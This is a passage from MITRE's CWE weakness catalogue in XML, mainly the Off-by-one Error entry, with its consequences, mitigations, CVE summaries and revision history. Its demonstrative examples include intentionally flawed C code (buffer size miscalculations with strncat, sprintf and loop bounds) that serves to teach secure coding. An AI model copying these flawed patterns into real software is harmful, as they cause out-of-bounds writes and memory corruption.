               <ns0:Modification_Date>2010-02-16</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Applicable_Platforms, Detection_Factors, Functional_Areas, Observed_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings, Terminology_Notes</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-04-05</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, Detection_Factors, Potential_Mitigations, References, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-06-21</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Potential_Mitigations, References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-09-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Observed_Examples, Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-09-13</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-05-11</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Demonstrative_Examples, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-10-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2013-07-17</ns0:Modification_Date>
               <ns0:Modification_Comment>updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-19</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-11-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Functional_Areas, Observed_Examples, References, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-03-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated References</ns0:Modification_Comment>
            </ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-01-03</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-09-19</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-02-24</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-06-25</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-08-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-12-10</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-03-15</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Potential_Mitigations</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-07-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-06-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-10-13</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-01-31</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Description, Detection_Factors</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-04-27</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-06-29</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Mapping_Notes, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
            <ns0:Contribution Type="Content">
               <ns0:Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</ns0:Contribution_Name>
               <ns0:Contribution_Organization>CWE-CAPEC ICS/OT SIG</ns0:Contribution_Organization>
               <ns0:Contribution_Date>2023-04-25</ns0:Contribution_Date>
               <ns0:Contribution_Comment>Suggested mappings to ISA/IEC 62443.</ns0:Contribution_Comment>
            </ns0:Contribution>
            <ns0:Previous_Entry_Name Date="2009-01-12">Integer Overflow (Wrap or Wraparound)</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Weakness>
      <ns0:Weakness ID="193" Name="Off-by-one Error" Abstraction="Base" Structure="Simple" Status="Draft">
         <ns0:Description>A product calculates or uses an incorrect maximum or minimum value that is 1 more, or 1 less, than the correct value.</ns0:Description>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="682" View_ID="1000" Ordinal="Primary" />
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="682" View_ID="1003" Ordinal="Primary" />
            <ns0:Related_Weakness Nature="CanPrecede" CWE_ID="617" View_ID="1000" />
            <ns0:Related_Weakness Nature="CanPrecede" CWE_ID="170" View_ID="1000" />
            <ns0:Related_Weakness Nature="CanPrecede" CWE_ID="119" View_ID="1000" />
         </ns0:Related_Weaknesses>
         <ns0:Applicable_Platforms>
            <ns0:Language Class="Not Language-Specific" Prevalence="Undetermined" />
         </ns0:Applicable_Platforms>
         <ns0:Alternate_Terms>
            <ns0:Alternate_Term>
               <ns0:Term>off-by-five</ns0:Term>
               <ns0:Description>An "off-by-five" error was reported for sudo in 2002 (CVE-2002-0184), but that is more like a "length calculation" error.</ns0:Description>
            </ns0:Alternate_Term>
         </ns0:Alternate_Terms>
         <ns0:Modes_Of_Introduction>
            <ns0:Introduction>
               <ns0:Phase>Implementation</ns0:Phase>
            </ns0:Introduction>
         </ns0:Modes_Of_Introduction>
         <ns0:Common_Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>DoS: Crash, Exit, or Restart</ns0:Impact>
               <ns0:Impact>DoS: Resource Consumption (CPU)</ns0:Impact>
               <ns0:Impact>DoS: Resource Consumption (Memory)</ns0:Impact>
               <ns0:Impact>DoS: Instability</ns0:Impact>
               <ns0:Note>This weakness will generally lead to undefined behavior and therefore crashes. In the case of overflows involving loop index variables, the likelihood of infinite loops is also high.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Memory</ns0:Impact>
               <ns0:Note>If the value in question is important to data (as opposed to flow), simple data corruption has occurred. Also, if the wrap around results in other conditions such as buffer overflows, further memory corruption may occur.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Code or Commands</ns0:Impact>
               <ns0:Impact>Bypass Protection Mechanism</ns0:Impact>
               <ns0:Note>This weakness can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a program's implicit security policy.</ns0:Note>
            </ns0:Consequence>
         </ns0:Common_Consequences>
         <ns0:Detection_Methods>
           <ns0:Detection_Method Detection_Method_ID="DM-14">
             <ns0:Method>Automated Static Analysis</ns0:Method>
             <ns0:Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</ns0:Description>
             <ns0:Effectiveness>High</ns0:Effectiveness>
           </ns0:Detection_Method>
         </ns0:Detection_Methods>
         <ns0:Potential_Mitigations>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>When copying character arrays or using character manipulation methods, the correct size parameter must be used to account for the null terminator that needs to be added at the end of the array. Some examples of functions susceptible to this weakness in C include strcpy(), strncpy(), strcat(), strncat(), printf(), sprintf(), scanf() and sscanf().</ns0:Description>
            </ns0:Mitigation>
         </ns0:Potential_Mitigations>
         <ns0:Demonstrative_Examples>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-20">
               <ns0:Intro_Text>The following code allocates memory for a maximum number of widgets. It then gets a user-specified number of widgets, making sure that the user does not request too many. It then initializes the elements of the array using InitializeWidget(). Because the number of widgets can vary for each request, the code inserts a NULL pointer to signify the location of the last widget.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>int i;<html:br />unsigned int numWidgets;<html:br />Widget **WidgetList;<html:br />
                     <html:br />numWidgets = GetUntrustedSizeValue();<html:br />if ((numWidgets == 0) || (numWidgets &gt; MAX_NUM_WIDGETS)) {<html:div style="margin-left:1em;">ExitError("Incorrect number of widgets requested!");</html:div>}<html:br />WidgetList = (Widget **)malloc(numWidgets * sizeof(Widget *));<html:br />printf("WidgetList ptr=%p\n", WidgetList);<html:br />for(i=0; i&lt;numWidgets; i++) {<html:div style="margin-left:1em;">WidgetList[i] = InitializeWidget();</html:div>}<html:br />WidgetList[numWidgets] = NULL;<html:br />showWidgets(WidgetList);</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>However, this code contains an off-by-one calculation error (CWE-193). It allocates exactly enough space to contain the specified number of widgets, but it does not include the space for the NULL pointer. As a result, the allocated buffer is smaller than it is supposed to be (CWE-131). So if the user ever requests MAX_NUM_WIDGETS, there is an out-of-bounds write (CWE-787) when the NULL is assigned. Depending on the environment and compilation settings, this could cause memory corruption.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
	    <ns0:Demonstrative_Example>
	      <ns0:Intro_Text>In this example, the code does not account for the terminating null character, and it writes one byte beyond the end of the buffer.</ns0:Intro_Text>
	      <ns0:Body_Text>The first call to strncat() appends up to 20 characters plus a terminating null character to fullname[]. There is plenty of allocated space for this, and there is no weakness associated with this first call. However, the second call to strncat() potentially appends another 20 characters. The code does not account for the terminating null character that is automatically added by strncat(). This terminating null character would be written one byte beyond the end of the fullname[] buffer. Therefore an off-by-one error exists with the second strncat() call, as the third argument should be 19.</ns0:Body_Text>
	      <ns0:Example_Code Nature="Bad" Language="C">
		<html:div>char firstname[20];<html:br />char lastname[20];<html:br />char fullname[40];<html:br /><html:br />fullname[0] = '\0';<html:br /><html:br />strncat(fullname, firstname, 20);<html:br />strncat(fullname, lastname, 20);</html:div>
	      </ns0:Example_Code>
	      <ns0:Body_Text>When using a function like strncat() one must leave a free byte at the end of the buffer for a terminating null character, thus avoiding the off-by-one weakness. Additionally, the last argument to strncat() is the number of characters to append, which must be less than the remaining space in the buffer. Be careful not to just use the total size of the buffer.</ns0:Body_Text>
	      <ns0:Example_Code Nature="Good" Language="C">
		<html:div>char firstname[20];<html:br />char lastname[20];<html:br />char fullname[40];<html:br /><html:br />fullname[0] = '\0';<html:br /><html:br />strncat(fullname, firstname, sizeof(fullname)-strlen(fullname)-1);<html:br />strncat(fullname, lastname, sizeof(fullname)-strlen(fullname)-1);</html:div>
              </ns0:Example_Code>
	      </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>The Off-by-one error can also be manifested when reading characters from a character array within a for loop that has an incorrect continuation condition.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>#define PATH_SIZE 60<html:br />
                     <html:br />char filename[PATH_SIZE];<html:br />
                     <html:br />for(i=0; i&lt;=PATH_SIZE; i++) {<html:br />
                     <html:div style="margin-left:1em;">
                        <html:div>char c = getc();<html:br />if (c == 'EOF') {<html:div style="margin-left:1em;">filename[i] = '\0';</html:div>}<html:br />
                           <html:br />filename[i] = getc();</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>In this case, the correct continuation condition is shown below.</ns0:Body_Text>
               <ns0:Example_Code Nature="Good" Language="C">
                  <html:div>for(i=0; i&lt;PATH_SIZE; i++) {<html:br />...</html:div>
               </ns0:Example_Code>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>As another example the Off-by-one error can occur when using the sprintf library function to copy a string variable to a formatted string variable and the original string variable comes from an untrusted source. As in the following example where a local function, setFilename is used to store the value of a filename to a database but first uses sprintf to format the filename. The setFilename function includes an input parameter with the name of the file that is used as the copy source in the sprintf function. The sprintf function will copy the file name to a char array of size 20 and specifies the format of the new variable as 16 characters followed by the file extension .dat.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>int setFilename(char *filename) {<html:div style="margin-left:1em;">char name[20];<html:br />sprintf(name, "%16s.dat", filename);<html:br />int success = saveFormattedFilenameToDB(name);<html:br />return success;</html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>However this will cause an Off-by-one error if the original filename is exactly 16 characters or larger because the format of 16 characters with the file extension is exactly 20 characters and does not take into account the required null terminator that will be placed at the end of the string.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
         </ns0:Demonstrative_Examples>
         <ns0:Observed_Examples>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2003-0252</ns0:Reference>
               <ns0:Description>Off-by-one error allows remote attackers to cause a denial of service and possibly execute arbitrary code via requests that do not contain newlines.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2003-0252</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2001-1391</ns0:Reference>
               <ns0:Description>Off-by-one vulnerability in driver allows users to modify kernel memory.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2001-1391</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-0083</ns0:Reference>
               <ns0:Description>Off-by-one error allows local users or remote malicious servers to gain privileges.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-0083</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-0653</ns0:Reference>
               <ns0:Description>Off-by-one buffer overflow in function usd by server allows local users to execute arbitrary code as the server user via .htaccess files with long entries.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-0653</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-0844</ns0:Reference>
               <ns0:Description>Off-by-one buffer overflow in version control system allows local users to execute arbitrary code.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-0844</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-1999-1568</ns0:Reference>
               <ns0:Description>Off-by-one error in FTP server allows a remote attacker to cause a denial of service (crash) via a long PORT command.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-1999-1568</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-0346</ns0:Reference>
               <ns0:Description>Off-by-one buffer overflow in FTP server allows local users to gain privileges via a 1024 byte RETR command.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-0346</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-0005</ns0:Reference>
               <ns0:Description>Multiple buffer overflows in chat client allow remote attackers to cause a denial of service and possibly execute arbitrary code.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-0005</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2003-0356</ns0:Reference>
               <ns0:Description>Multiple off-by-one vulnerabilities in product allow remote attackers to cause a denial of service and possibly execute arbitrary code.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2003-0356</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2001-1496</ns0:Reference>
               <ns0:Description>Off-by-one buffer overflow in server allows remote attackers to cause a denial of service and possibly execute arbitrary code.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2001-1496</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-0342</ns0:Reference>
               <ns0:Description>This is an interesting example that might not be an off-by-one.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-0342</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2001-0609</ns0:Reference>
               <ns0:Description>An off-by-one enables a terminating null to be overwritten, which causes 2 strings to be merged and enable a format string.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2001-0609</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-1745</ns0:Reference>
               <ns0:Description>Off-by-one error allows source code disclosure of files with 4 letter extensions that match an accepted 3-letter extension.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-1745</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-1816</ns0:Reference>
               <ns0:Description>Off-by-one buffer overflow.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-1816</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-1721</ns0:Reference>
               <ns0:Description>Off-by-one error causes an snprintf call to overwrite a critical internal variable with a null value.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-1721</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2003-0466</ns0:Reference>
               <ns0:Description>Off-by-one error in function used in many products leads to a buffer overflow during pathname management, as demonstrated using multiple commands in an FTP server.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2003-0466</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2003-0625</ns0:Reference>
               <ns0:Description>Off-by-one error allows read of sensitive memory via a malformed request.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2003-0625</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2006-4574</ns0:Reference>
               <ns0:Description>Chain: security monitoring product has an off-by-one error that leads to unexpected length values, triggering an assertion.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2006-4574</ns0:Link>
            </ns0:Observed_Example>
         </ns0:Observed_Examples>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <ns0:Entry_Name>Off-by-one Error</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>STR31-C</ns0:Entry_ID>
               <ns0:Entry_Name>Guarantee that storage for strings has sufficient space for character data and the null terminator</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-155" />
            <ns0:Reference External_Reference_ID="REF-156" />
            <ns0:Reference External_Reference_ID="REF-157" />
            <ns0:Reference External_Reference_ID="REF-140" Section="Chapter 7, &quot;Buffer Overflow&quot;" />
            <ns0:Reference External_Reference_ID="REF-44" Section="&quot;Sin 5: Buffer Overruns.&quot; Page 89" />
            <ns0:Reference External_Reference_ID="REF-62" Section="Chapter 5, &quot;Off-by-One Errors&quot;, Page 180" />
         </ns0:References>
         <ns0:Mapping_Notes>
            <ns0:Usage>Allowed</ns0:Usage>
            <ns0:Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</ns0:Rationale>
            <ns0:Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</ns0:Comments>
            <ns0:Reasons>
               <ns0:Reason Type="Acceptable-Use" />
            </ns0:Reasons>
         </ns0:Mapping_Notes>
         <ns0:Notes>
            <ns0:Note Type="Relationship">This is not always a buffer overflow. For example, an off-by-one error could be a factor in a partial comparison, a read from the wrong memory location, an incorrect conditional, etc.</ns0:Note>
         </ns0:Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>PLOVER</ns0:Submission_Name>
               <ns0:Submission_Date>2006-07-19</ns0:Submission_Date>
               <ns0:Submission_Version>Draft 3</ns0:Submission_Version>
               <ns0:Submission_ReleaseDate>2006-07-19</ns0:Submission_ReleaseDate>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-09-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Alternate_Terms, Common_Consequences, Relationships, Observed_Example, Relationship_Notes, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-11-24</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-12-28</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-02-16</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-12-13</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-09-13</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-05-11</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Observed_Examples, References, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-06-23</ns0:Modification_Date>
               <ns0:Modification_Comment>updated References</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-03</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
